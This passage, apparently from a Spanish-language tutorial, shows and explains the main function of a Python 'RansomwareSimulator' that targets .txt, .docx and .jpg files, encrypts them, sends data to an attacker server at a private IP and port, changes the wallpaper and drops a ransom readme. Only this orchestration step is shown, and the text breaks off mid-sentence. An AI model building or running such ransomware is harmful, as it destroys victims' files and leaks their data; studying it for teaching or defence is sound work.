```
def main():
    file_extensions = ['.txt', '.docx', '.jpg']
    directory = 'dosyalar/'  # 'dosyalar/' should be replaced with the directory path you want to target
    wallpaper_path = r"duvarkağıtı/araba.jpg"
    server_host = '10.0.2.37'
    server_port = 12345

    simulator = RansomwareSimulator(directory, server_host, server_port, file_extensions)
    simulator.find_and_encrypt_files()
    simulator.send_data_to_server()
    simulator.change_wallpaper(wallpaper_path)  # Change the wallpaper
    simulator.create_readme()
    simulator.clear_memory()
```
Este es el método principal del ramsonware, en el se encuentra la declaración e inicialización de las variables con las que se va a trabajar durante la ejecución del programa, entre estas variables está: las extensiones objetivo a atacar, el directorio donde se encuentran los archivos importantes (comunmente documentos o escritorio), la ruta de la imagen que será el fonde de pantalla, el server host y el server port del servidor del atacante.

Crea un objeto de tipo RansomwareSimulator, que agrupa métodos para cifrar archivos, recolectar datos, comunicarse con el servidor, entre otros vistos anteriormente, llama al método de busqueda y ciftado (find_and_encrypt_files), envia la información al servidor del atacante 